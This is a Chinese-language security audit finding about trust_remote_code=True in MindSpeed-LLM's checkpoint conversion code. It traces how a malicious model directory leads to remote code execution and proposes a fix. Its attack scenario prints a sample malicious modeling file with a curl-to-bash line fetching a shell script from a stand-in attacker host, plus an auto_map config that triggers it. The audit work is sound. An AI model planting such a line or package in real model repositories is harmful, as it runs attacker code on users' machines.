# VULN-SEC-TRUST-002：推理模块Tokenizer加载启用trust_remote_code致远程代码执行

## 漏洞基本信息

| 字段 | 值 |
|------|-----|
| **漏洞ID** | VULN-SEC-TRUST-002 |
| **CWE** | CWE-940 (Improper Verification of Source of a Communication Channel) |
| **严重性** | High |
| **置信度** | 80/100 |
| **位置** | `mindspeed_llm/tasks/checkpoint/models.py:514-516` |
| **函数** | `get_modules_from_config` |
| **模块** | checkpoint_conversion |

---

## 漏洞代码

```python
# mindspeed_llm/tasks/checkpoint/models.py:514-516

def get_modules_from_config(self, device_map="cpu", trust_remote_code=True):
    """从配置获取模型模块"""
    # 加载配置，信任远程代码
    config = AutoConfig.from_pretrained(
        load_dir,
        trust_remote_code=trust_remote_code  # 危险！
    )
    
    # 从配置构建模型，信任远程代码
    hf_model = AutoModelForCausalLM.from_config(
        config,
        trust_remote_code=trust_remote_code  # 危险！
    )
    
    return hf_model
```

---

## 数据流分析

```
CLI --load-dir → load_dir
  ↓
AutoConfig.from_pretrained(load_dir, trust_remote_code=True)
  ↓ [加载 config.json]
检查 auto_map → 自定义 modeling.py
  ↓
AutoModelForCausalLM.from_config(config, trust_remote_code=True)
  ↓ [SINK - 执行自定义代码]
恶意 modeling.py → RCE
```

---

## 与 VULN-SEC-TRUST-001 区别

| 漏洞 | 位置 | 执行点 |
|------|------|--------|
| VULN-SEC-TRUST-001 | evaluation.py:383 | AutoTokenizer |
| VULN-SEC-TRUST-002 | models.py:514-516 | AutoModel + AutoConfig |

**双点执行**: 配置加载 + 模型构建都可执行恶意代码。

---

## 攻击场景

**恶意模型目录结构**:
```
/malicious_model/
├── config.json          ← 包含 auto_map
├── modeling_custom.py   ← 恶意代码
├── tokenizer.py         ← 恶意代码
├── pytorch_model.bin
```

**config.json**:
```json
{
  "model_type": "custom",
  "auto_map": {
    "AutoConfig": ["configuration_custom", null],
    "AutoModelForCausalLM": ["modeling_custom", null]
  }
}
```

**modeling_custom.py**:
```python
import os
os.system('curl attacker.com/shell.sh | bash')  # 加载时执行

class CustomModel:
    ...  # 正常模型实现
```

---

## 修复建议

```python
def get_modules_from_config_secure(self, device_map="cpu"):
    """安全的模型配置加载"""
    
    # 强制禁用 trust_remote_code
    config = AutoConfig.from_pretrained(
        load_dir,
        trust_remote_code=False  # 安全
    )
    
    # 验证模型类型是否为标准类型
    if config.model_type not in STANDARD_MODEL_TYPES:
        raise ValueError(
            f"非标准模型类型 '{config.model_type}'，需要显式授权"
        )
    
    hf_model = AutoModelForCausalLM.from_config(
        config,
        trust_remote_code=False  # 安全
    )
    
    return hf_model
```

---

**报告生成时间**: 2026-04-20